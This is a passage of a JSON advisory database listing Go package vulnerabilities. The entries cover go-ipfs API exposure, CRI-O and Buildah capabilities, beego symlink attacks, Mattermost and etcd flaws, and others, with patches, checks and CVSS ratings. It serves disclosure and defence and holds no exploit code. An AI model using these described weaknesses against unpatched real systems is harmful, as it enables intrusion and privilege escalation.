?\n\nThis affects people running the  [docker-compose.yaml](https://github.com/ipfs/go-ipfs/blob/master/docker-compose.yaml) service in an environment where the docker host is directly attached to a public or untrusted IP.  In the vulnerable version, the private API endpoint is publicly forwarded by exposing it as `0.0.0.0:5001` on the host machine.  \n\nIf the host machine is hidden behind a firewall or NAT (and the LAN is trusted for NAT), this is not an immediate issue because of the protection from the firewall or NAT.  That said, we still recommend users update to follow security best practices of not putting unnecessary dependency on a working firewall.\n\n### Patches\nThis issue is in [docker-compose.yaml](https://github.com/ipfs/go-ipfs/blob/master/docker-compose.yaml).  Users need to replace their current `docker-compose.yaml` file with a version `0.12.1` or later.\n\nThere is no need to update any of the binaries. Users running previous versions like `0.12.0` or earlier can download the `0.12.1` `docker-compose.yaml` file.  You can replace a vulnerable `docker-compose.yaml` file with a the new one with:\n\n```\ncurl https://raw.githubusercontent.com/ipfs/go-ipfs/v0.12.1/docker-compose.yaml > docker-compose.yaml\n```\n\n### How to test if you are vulnerable\n#### Binding check on the host\nOn the host machine, while IPFS is running, run as root:\n\n```bash\nnetstat -lnp | grep \":5001\"\n```\n\nThe output will be a list of listeners bound to `:5001`.\nYou then need to check that those listeners are private and preferably even localhost IPs.\n\u26a0\ufe0f If this listener is on `0.0.0.0` or a public IP you are very likely vulnerable.\n\n#### Remote hailing\nWhile IPFS is running, you can try to contact the API from a remote machine. (Replace `1.2.3.4` with your node public IP.  Or if you want to test in an untrusted NAT, then substitute the LAN IP instead.)\n\n```bash\ncurl -X POST http://1.2.3.4:5001/api/v0/version\n```\n\n\u26a0\ufe0f If you see any json outputted (e.g.,  `{\"Commit\": \"<string>\",\"Golang\": \"<string>\",\"Repo\": \"<string>\",\"System\": \"<string>\",\"Version\": \"<string>\"}`), then you are vulnerable.\n\nIf it **fails**, then you are safe.\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Please first read https://docs.ipfs.io/reference/http/api/ about best practices\n* Ask in [IPFS Discord #ipfs-chatter](https://discord.gg/ipfs)\n* Open an issue in [go-ipfs](https://github.com/ipfs/go-ipfs)\n", "severity": [], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/ipfs/go-ipfs"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0.11.0"}, {"fixed": "0.12.1"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/ipfs/go-ipfs/security/advisories/GHSA-fx5p-f64h-93xc"}, {"type": "WEB", "url": "https://github.com/ipfs/go-ipfs/pull/8773"}, {"type": "WEB", "url": "https://github.com/ipfs/go-ipfs/commit/816a128aaf963d72c4930852ce32b9a4e31924a1"}, {"type": "PACKAGE", "url": "https://github.com/ipfs/go-ipfs"}, {"type": "WEB", "url": "https://github.com/ipfs/go-ipfs/releases/tag/v0.12.1"}], "database_specific": {"cwe_ids": [], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2022-04-04T21:23:55Z", "nvd_published_at": null}}, {"schema_version": "1.4.0", "id": "GHSA-4hj2-r2pm-3hc6", "modified": "2022-04-28T18:10:23Z", "published": "2022-04-22T20:42:46Z", "aliases": ["CVE-2022-27652"], "summary": "Incorrect Default Permissions in CRI-O", "details": "### Impact\n\nA bug was found in CRI-O where containers were incorrectly started with non-empty inheritable Linux process capabilities, creating an atypical Linux environment and enabling programs with inheritable file capabilities to elevate those capabilities to the permitted set during `execve(2)`.  Normally, when executable programs have specified permitted file capabilities, otherwise unprivileged users and processes can execute those programs and gain the specified file capabilities up to the bounding set.  Due to this bug, containers which included executable programs with inheritable file capabilities allowed otherwise unprivileged users and processes to additionally gain these inheritable file capabilities up to the container's bounding set.  Containers which use Linux users and groups to perform privilege separation inside the container are most directly impacted.\n\nThis bug did not affect the container security sandbox as the inheritable set never contained more capabilities than were included in the container's bounding set.\n\n\n### Patches\n\nThis bug will been fixed in the following versions of CRI-O:\n- v1.24.0\n\nUsers should update to the version corresponding to their minor release as soon as possible.  Running containers should be stopped, deleted, and recreated for the inheritable capabilities to be reset.\n\nThis fix changes CRI-O behavior such that containers are started with a more typical Linux environment.  Refer to `capabilities(7)` for a description of how capabilities work.  Note that permitted file capabilities continue to allow for privileges to be raised up to the container's bounding set and that processes may add capabilities to their own inheritable set up to the container's bounding set per the rules described in the manual page.  In all cases the container's bounding set provides an upper bound on the capabilities that can be assumed and provides for the container security sandbox.\n\n### Workarounds\n\nThe entrypoint of a container can be modified to use a utility like `capsh(1)` to drop inheritable capabilities prior to the primary process starting.\n\n### Credits\n\nCRI-O would like to thank [Andrew G. Morgan](https://github.com/AndrewGMorgan) for responsibly disclosing this issue, as well as the Moby (Docker Engine) project for working with the other container engines in coordinating a fix.\n\n### For more information\n\nIf you have any questions or comments about this advisory:\n\n* [Open an issue](https://github.com/cri-o/cri-o/issues/new)\n* Email us at [cncf-crio-security@lists.cncf.io](cncf-crio-security@lists.cncf.io) if you think you\u2019ve found a security bug\n\n------------------\n\nhttps://www.first.org/cvss/calculator/3.1#CVSS:3.1/AV:L/AC:L/PR:L/UI:R/S:U/C:L/I:L/A:L\n4.8/Medium\n\n|Metric\t|Value\t|Comments\t|\n|---\t|---\t|---\t|\n|Attack Vector (AV)\t|Local\t|An attacker requires local control to launch a container with files that have inheritable capabilities. \t|\n|Attack Complexity (AC)\t|Low\t|Modifying a file to have inheritable capabilities is not difficult.\t|\n|Privileges Required (PR)\t|Low\t|An attacker requires enough privilege to cause a container to be launched with a compromised image.  Moby's API is typically bound to a local Unix domain socket and requires calls to be made from a process that is either UID 0 or present in the configured group.\t|\n|User Interaction (UI)\t|Required\t|An attacker must cause the compromised image to be run.\t|\n|Scope (S)\t|Unchanged\t|The container boundary set by Moby, including the bounding capability set, is not modified.  A successful attack gains access to privileges and resources within the boundary, not outside of it.\t|\n|Confidentiality (C)\t|Low\t|An attacker may gain access to some confidential information through elevation of CAP_CHOWN, CAP_DAC_OVERRIDE, CAP_FOWNER, CAP_SETFCAP, or CAP_SETPCAP, but the exposed information is limited to that which is already inside the container.\t|\n|Integrity (I)\t|Low\t|An attacker may be able to tamper with data inside the container through elevation of CAP_CHOWN, CAP_DAC_OVERRIDE, CAP_FOWNER, CAP_SETFCAP, or CAP_SETPCAP, or spoof packets with CAP_NET_RAW, but the tampered data is limited to that which is already inside the container.\t|\n|Availability (A)\t|Low\t|An attacker may be able to affect the availability of an application running inside the container through elevation of CAP_KILL or CAP_NET_RAW, or may be able to affect availability through tampering with file dependencies.\t|\n\n", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:L/AC:L/PR:L/UI:R/S:U/C:L/I:L/A:L"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/cri-o/cri-o"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.24.0"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/cri-o/cri-o/security/advisories/GHSA-4hj2-r2pm-3hc6"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-27652"}, {"type": "WEB", "url": "https://bugzilla.redhat.com/show_bug.cgi?id=2066839"}, {"type": "PACKAGE", "url": "https://github.com/cri-o/cri-o"}], "database_specific": {"cwe_ids": ["CWE-276"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2022-04-22T20:42:46Z", "nvd_published_at": "2022-04-18T17:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-2v6v-q994-xvxx", "modified": "2022-04-15T03:08:35Z", "published": "2022-04-06T00:01:30Z", "aliases": ["CVE-2021-27117"], "summary": "Privilege escalation in beego", "details": "beego is an open-source, high-performance web framework for the Go programming language. An issue was discovered in file profile.go in function GetCPUProfile in beego through 2.0.2, allows attackers to launch symlink attacks locally.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/beego/beego/v2"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "2.0.0"}, {"fixed": "2.0.2"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/beego/beego"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}]}], "database_specific": {"last_known_affected_version_range": "< 2.0.2"}}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2021-27117"}, {"type": "WEB", "url": "https://github.com/beego/beego/issues/4484"}, {"type": "PACKAGE", "url": "https://github.com/beego/beego"}], "database_specific": {"cwe_ids": ["CWE-59"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2022-04-07T22:04:06Z", "nvd_published_at": "2022-04-05T16:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-fxwj-v664-wv5g", "modified": "2022-04-28T19:49:33Z", "published": "2022-04-20T00:00:30Z", "aliases": ["CVE-2022-1385"], "summary": "Improper Control of a Resource Through its Lifetime in Mattermost", "details": "Mattermost 6.4.x and earlier fails to properly invalidate pending email invitations when the action is performed from the system console, which allows accidentally invited users to join the workspace and access information from the public teams and channels.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:U/C:L/I:L/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/mattermost/mattermost-server/v6"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "6.5.0"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-1385"}, {"type": "WEB", "url": "https://hackerone.com/reports/1486820"}, {"type": "PACKAGE", "url": "https://github.com/mattermost/mattermost-server"}, {"type": "WEB", "url": "https://mattermost.com/security-updates/"}], "database_specific": {"cwe_ids": ["CWE-664", "CWE-668"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2022-04-22T20:57:43Z", "nvd_published_at": "2022-04-19T21:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-qggc-pj29-j27m", "modified": "2022-04-22T21:05:51Z", "published": "2022-04-14T00:00:17Z", "aliases": ["CVE-2022-1332"], "summary": "Improper Privilege Management in Mattermost", "details": "One of the API in Mattermost version 6.4.1 and earlier fails to properly protect the permissions, which allows the authenticated members with restricted custom admin role to bypass the restrictions and view the server logs and server config.json file contents. Per the Mattermost security updates page, versions 6.4.2, 6.3.5, 6.2.5, and 5.37.9 contain patches for this issue", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/mattermost/mattermost-server/v6"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "6.4.0"}, {"fixed": "6.4.2"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/mattermost/mattermost-server/v6"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "6.3.0"}, {"fixed": "6.3.5"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/mattermost/mattermost-server/v6"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "6.0.0"}, {"fixed": "6.2.5"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/mattermost/mattermost-server/v5"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "5.37.9"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-1332"}, {"type": "PACKAGE", "url": "https://github.com/mattermost/mattermost-server"}, {"type": "WEB", "url": "https://mattermost.com/security-updates/"}], "database_specific": {"cwe_ids": ["CWE-200", "CWE-269"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2022-04-22T21:05:32Z", "nvd_published_at": "2022-04-13T18:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-xg75-q3q5-cqmv", "modified": "2022-04-22T20:55:52Z", "published": "2022-04-22T20:55:52Z", "aliases": ["CVE-2022-24863"], "summary": "Denial of Service in http-swagger", "details": "### Impact\nAllows an attacker to perform a DOS attack consisting of memory exhaustion on the host system.\n\n### Patches\nYes. Please upgrade to v1.2.6.\n\n### Workarounds\nA workaround is to restrict the path prefix to the \"GET\" method. As shown below\n```\nfunc main() {\n\tr := mux.NewRouter()\n\n\tr.PathPrefix(\"/swagger/\").Handler(httpSwagger.Handler(\n\t\thttpSwagger.URL(\"http://localhost:1323/swagger/doc.json\"), //The url pointing to API definition\n\t\thttpSwagger.DeepLinking(true),\n\t\thttpSwagger.DocExpansion(\"none\"),\n\t\thttpSwagger.DomID(\"#swagger-ui\"),\n\t)).Methods(http.MethodGet)\n```\n\n### References\nReporter dongguangli from https://www.huoxian.cn/ company\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Open an issue in [http-swagger](https://github.com/swaggo/http-swagger/issues)\n\n", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/swaggo/http-swagger"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.2.6"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/swaggo/http-swagger/security/advisories/GHSA-xg75-q3q5-cqmv"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-24863"}, {"type": "WEB", "url": "https://github.com/swaggo/http-swagger/pull/62"}, {"type": "WEB", "url": "https://github.com/swaggo/http-swagger/commit/b7d83e8fba85a7a51aa7e45e8244b4173f15049e"}, {"type": "PACKAGE", "url": "https://github.com/swaggo/http-swagger"}, {"type": "WEB", "url": "https://github.com/swaggo/http-swagger/releases/tag/v1.2.6"}], "database_specific": {"cwe_ids": ["CWE-400", "CWE-755"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2022-04-22T20:55:52Z", "nvd_published_at": "2022-04-18T19:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-ffjp-66mx-3qpj", "modified": "2022-04-07T18:31:32Z", "published": "2022-04-06T00:01:30Z", "aliases": ["CVE-2021-27116"], "summary": "Privilege escalation in beego", "details": "An issue was discovered in file profile.go. The MemProf and GetCPUProfile functions do not correctly check whether the created file exists. As a result attackers can launch attacks symlink attacks locally. Attackers can use this vulnerability to escalate privileges.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/beego/beego/v2"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "2.0.0"}, {"fixed": "2.0.2"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/beego/beego"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}]}], "database_specific": {"last_known_affected_version_range": "< 2.0.2"}}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2021-27116"}, {"type": "WEB", "url": "https://github.com/beego/beego/issues/4484"}, {"type": "PACKAGE", "url": "https://github.com/beego/beego"}], "database_specific": {"cwe_ids": ["CWE-59"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2022-04-07T18:31:32Z", "nvd_published_at": "2022-04-05T16:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-c3g4-w6cv-6v7h", "modified": "2022-04-19T18:02:46Z", "published": "2022-04-01T13:56:42Z", "aliases": ["CVE-2022-27651"], "summary": "Non-empty default inheritable capabilities for linux container in Buildah", "details": "A bug was found in Buildah where containers were created with non-empty inheritable Linux process capabilities, creating an atypical Linux environment and enabling programs with inheritable file capabilities to elevate those capabilities to the permitted set during execve(2).\n\nThis bug did not affect the container security sandbox as the inheritable set never contained more capabilities than were included in the container's bounding set.\n", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:H/I:H/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/containers/buildah"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.25.0"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/containers/buildah/security/advisories/GHSA-c3g4-w6cv-6v7h"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-27651"}, {"type": "WEB", "url": "https://github.com/containers/buildah/pull/3855"}, {"type": "WEB", "url": "https://github.com/containers/buildah/commit/90b3254c7404039c1c786999ac189654228f6e0e"}, {"type": "WEB", "url": "https://github.com/containers/buildah/commit/e7e55c988c05dd74005184ceb64f097a0cfe645b"}, {"type": "WEB", "url": "https://bugzilla.redhat.com/show_bug.cgi?id=2066840"}, {"type": "PACKAGE", "url": "https://github.com/containers/buildah"}, {"type": "WEB", "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/25YI27MENCEPZTTGRVU6BQD5V53FNI52/"}, {"type": "WEB", "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/2VWH6X6HOFPO6HTESF42HIJZEPXSWVIO/"}, {"type": "WEB", "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/7NETC7I6RTMMBRJJQVJOJUPDK4W4PQSJ/"}, {"type": "WEB", "url": "https://pkg.go.dev/vuln/GO-2022-0417"}], "database_specific": {"cwe_ids": ["CWE-276"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2022-04-01T13:56:42Z", "nvd_published_at": "2022-04-04T20:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-27rq-4943-qcwp", "modified": "2022-06-02T17:38:26Z", "published": "2022-04-28T00:00:35Z", "aliases": ["CVE-2022-29810"], "summary": "Insertion of Sensitive Information into Log File in Hashicorp go-getter", "details": "The Hashicorp go-getter library before 1.5.11 could write SSH credentials into its logfile, exposing sensitive credentials to local users able to read the logfile.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/hashicorp/go-getter"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.5.11"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-29810"}, {"type": "WEB", "url": "https://github.com/hashicorp/go-getter/pull/348"}, {"type": "WEB", "url": "https://github.com/hashicorp/go-getter/commit/36b68b2f68a3ed10ee7ecbb0cb9f6b1dc5da49cc"}, {"type": "PACKAGE", "url": "https://github.com/hashicorp/go-getter"}, {"type": "WEB", "url": "https://github.com/hashicorp/go-getter/releases/tag/v1.5.11"}, {"type": "WEB", "url": "https://pkg.go.dev/vuln/GO-2022-0438"}], "database_specific": {"cwe_ids": ["CWE-532"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2022-05-03T20:19:26Z", "nvd_published_at": "2022-04-27T06:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-h6xx-pmxh-3wgp", "modified": "2023-08-30T11:13:45Z", "published": "2022-04-12T22:41:32Z", "aliases": ["CVE-2018-16886"], "summary": "go.etcd.io/etcd Authentication Bypass", "details": "etcd versions 3.2.x before 3.2.26 and 3.3.x before 3.3.11 are vulnerable to an improper authentication issue when role-based access control (RBAC) is used and client-cert-auth is enabled. If an etcd client server TLS certificate contains a Common Name (CN) which matches a valid RBAC username, a remote attacker may authenticate as that user with any valid (trusted) client certificate in a REST API request to the gRPC-gateway.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "go.etcd.io/etcd/v3"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "3.2.0"}, {"fixed": "3.2.26"}]}]}, {"package": {"ecosystem": "Go", "name": "go.etcd.io/etcd/v3"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "3.3.0"}, {"fixed": "3.3.11"}]}]}, {"package": {"ecosystem": "Go", "name": "go.etcd.io/etcd"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.5.0-alpha.5.0.20190108173120-83c051b701d3"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2018-16886"}, {"type": "WEB", "url": "https://github.com/etcd-io/etcd/pull/10366"}, {"type": "WEB", "url": "https://github.com/etcd-io/etcd/commit/0191509637546621d6f2e18e074e955ab8ef374d"}, {"type": "WEB", "url": "https://github.com/etcd-io/etcd/commit/bf9d0d8291dc71ecbfb2690612954e1a298154b2"}, {"type": "WEB", "url": "https://access.redhat.com/errata/RHSA-2019:0237"}, {"type": "WEB", "url": "https://access.redhat.com/errata/RHSA-2019:1352"}, {"type": "WEB", "url": "https://bugzilla.redhat.com/show_bug.cgi?id=CVE-2018-16886"}, {"type": "PACKAGE", "url": "https://github.com/etcd-io/etcd"}, {"type": "WEB", "url": "https://github.com/etcd-io/etcd/blob/1eee465a43720d713bb69f7b7f5e120135fdb1ac/CHANGELOG-3.2.md#security-authentication"}, {"type": "WEB", "url": "https://github.com/etcd-io/etcd/blob/1eee465a43720d713bb69f7b7f5e120135fdb1ac/CHANGELOG-3.3.md#security-authentication"}, {"type": "WEB", "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/JX7QTIT465BQGRGNCE74RATRQLKT2QE4/"}, {"type": "WEB", "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/UPGYHMSKDPW5GAMI7BEP3XQRVRLLBJKS/"}, {"type": "WEB", "url": "https://pkg.go.dev/vuln/GO-2021-0077"}, {"type": "WEB", "url": "http://www.securityfocus.com/bid/106540"}], "database_specific": {"cwe_ids": ["CWE-285", "CWE-287"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2021-05-19T21:49:34Z", "nvd_published_at": null}}, {"schema_version": "1.4.0", "id": "GHSA-g3vv-g2j5-45f2", "modified": "2023-08-30T17:56:37Z", "published": "2022-04-08T22:08:45Z", "aliases": [], "summary": "ipld/go-codec-dagpb panics when processing certain blocks", "details": "### Impact \nDecoding certain blocks using the go-ipld-prime version of the dag-pb codec (go-codec-dagpb) can cause a panic.  The panic comes from an assumption that the reported link length is accurate, but if the block ends before that reported length then it\u2019s a buffer overread.\n\n### Patches\nThe issue is fixed in v1.3.1 and above.\n\nConsumers can discover the versions of `go-codec-dagpb` in a module's dependency graph using the following command in the module root:\n\n```go mod graph | grep go-codec-dagpb```\n\n### Workarounds\nYou can work around this issue without upgrading by recovering panics higher in the call stack of the goroutine that calls the defective code.\n\n### For more information\nIf you have any questions or comments about this advisory:\n\n* Ask in [IPFS Discord #ipld-chatter](https://discord.gg/ipfs)\n* Open an issue in [go-codec-dagpb](https://github.com/ipld/go-codec-dagpb)", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/ipld/go-codec-dagpb"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.3.1"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/ipld/go-codec-dagpb/security/advisories/GHSA-g3vv-g2j5-45f2"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-2584"}, {"type": "WEB", "url": "https://github.com/ipld/go-codec-dagpb/commit/a17ace35cc760a2698645c09868f9050fa219f57"}, {"type": "WEB", "url": "https://pkg.go.dev/vuln/GO-2022-0422"}, {"type": "PACKAGE", "url": "github.com/ipld/go-codec-dagpb"}], "database_specific": {"cwe_ids": ["CWE-119"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2022-04-08T22:08:45Z", "nvd_published_at": null}}, {"schema_version": "1.4.0", "id": "GHSA-f37q-q7p2-ccfc", "modified": "2022-04-26T13:05:37Z", "published": "2022-04-14T00:00:17Z", "aliases": ["CVE-2022-1337"], "summary": "Resource exhaustion in Mattermost", "details": "The image proxy component in Mattermost version 6.4.1 and earlier allocates memory for multiple copies of a proxied image, which allows an authenticated attacker to crash the server via links to very large image files.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/mattermost/mattermost-server/v6"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "6.4.2"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-1337"}, {"type": "PACKAGE", "url": "https://github.com/mattermost/mattermost-server"}, {"type": "WEB", "url": "https://mattermost.com/security-updates/"}], "database_specific": {"cwe_ids": ["CWE-400", "CWE-770"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2022-04-26T13:05:37Z", "nvd_published_at": "2022-04-13T18:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-mqf3-28j7-3mj6", "modified": "2023-02-03T20:43:21Z", "published": "2022-04-12T22:40:14Z", "aliases": ["CVE-2015-7528"], "summary": "Information Exposure in Kubernetes", "details": "Kubernetes before 1.2.0-alpha.5 allows remote attackers to read arbitrary pod logs via a container name.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/kubernetes/kubernetes"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.2.0"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2015-7528"}, {"type": "WEB", "url": "https://github.com/kubernetes/kubernetes/pull/17886"}, {"type": "WEB", "url": "https://github.com/openshift/origin/pull/6113"}, {"type": "WEB", "url": "https://github.com/kubernetes/kubernetes/commit/afd56495a1052a3387b81df1786a8d0f51bc8671"}, {"type": "WEB", "url": "https://access.redhat.com/errata/RHSA-2015:2544"}, {"type": "WEB", "url": "https://access.redhat.com/errata/RHSA-2015:2615"}, {"type": "WEB", "url": "https://access.redhat.com/security/cve/CVE-2015-7528"}, {"type": "WEB", "url": "https://bugzilla.redhat.com/show_bug.cgi?id=1286745"}, {"type": "PACKAGE", "url": "https://github.com/kubernetes/kubernetes"}, {"type": "WEB", "url": "https://github.com/kubernetes/kubernetes/releases/tag/v1.2.0-alpha.5"}, {"type": "WEB", "url": "https://rhn.redhat.com/errata/RHSA-2015-2615.html"}], "database_specific": {"cwe_ids": ["CWE-200"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2021-05-19T22:12:31Z", "nvd_published_at": "2016-04-11T21:59:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-vmp5-c5hp-6c65", "modified": "2022-05-26T19:48:38Z", "published": "2022-04-30T00:00:33Z", "aliases": ["CVE-2022-29947"], "summary": "Woodpecker allows cross-site scripting (XSS) via build logs", "details": "Woodpecker before 0.15.1 allows XSS via build logs because web/src/components/repo/build/BuildLog.vue lacks escaping.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/woodpecker-ci/woodpecker"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.15.1"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-29947"}, {"type": "WEB", "url": "https://github.com/woodpecker-ci/woodpecker/pull/879"}, {"type": "PACKAGE", "url": "https://github.com/woodpecker-ci/woodpecker/"}, {"type": "WEB", "url": "https://github.com/woodpecker-ci/woodpecker/releases/tag/v0.15.1"}], "database_specific": {"cwe_ids": ["CWE-79"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2022-05-03T20:18:08Z", "nvd_published_at": "2022-04-29T21:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-mcq2-w56r-5w2w", "modified": "2022-04-08T22:09:23Z", "published": "2022-04-08T22:09:23Z", "aliases": [], "summary": "Daemon panics when processing certain blocks", "details": "### Impact\ngo-ipfs nodes with versions 0.10.0, 0.11.0, 0.12.0, or 0.12.1 can crash when trying to traverse certain malformed graphs due to an issue in the go-codec-dagpb dependency.  Vulnerable nodes that work with these malformed graphs may crash leading to denial-of-service risks.\n\nThis particularly impacts nodes that download or export data that is controlled by external user input as there is the possibility that a malicious user of those services could (intentionally or unintentionally) cause the node to traverse a malformed graph. Some notable use cases include public gateways and pinning services which fetch data on behalf of users, as well as applications such as IPFS Companion which load data based on a user visiting a website with links to IPFS URLs.\n\n### Patches\nVersions v0.11.1 and v0.12.2 both resolve this issue. This should make it easy to upgrade, even if you have not yet performed the v0.12.0 migration.\n\nFor those running on forked versions of go-ipfs or who are on v0.10.0 and are having trouble with the v0.11.0 breaking changes, simply updating the version of `go-codec-dagpb` you are using to >=v1.3.2 should resolve the issue.\n\nAny users of libraries within the go-ipfs ecosystem, even if not the go-ipfs package or binary itself, may be affected and should upgrade their dependency on go-codec-dagpb. You can check if your Go module has a dependency on `go-codec-dagpb` by running a command such as `go mod graph | grep go-codec-dagpb` in your module root.\n\n### Workarounds\nThe best way to workaround this issue is to control exposure to any endpoints that allow for arbitrary IPLD traversals. This primarily includes the HTTP RPC API (https://docs.ipfs.io/reference/http/api ) and the Gateway API.  If you are exposing those APIs, then do so within an environment where only trusted users and applications you control have access to it.  You should be safe as long as your users and applications do not create malformed graphs, which should not happen using standard `go-ipfs` tooling.\n\nIf you previously 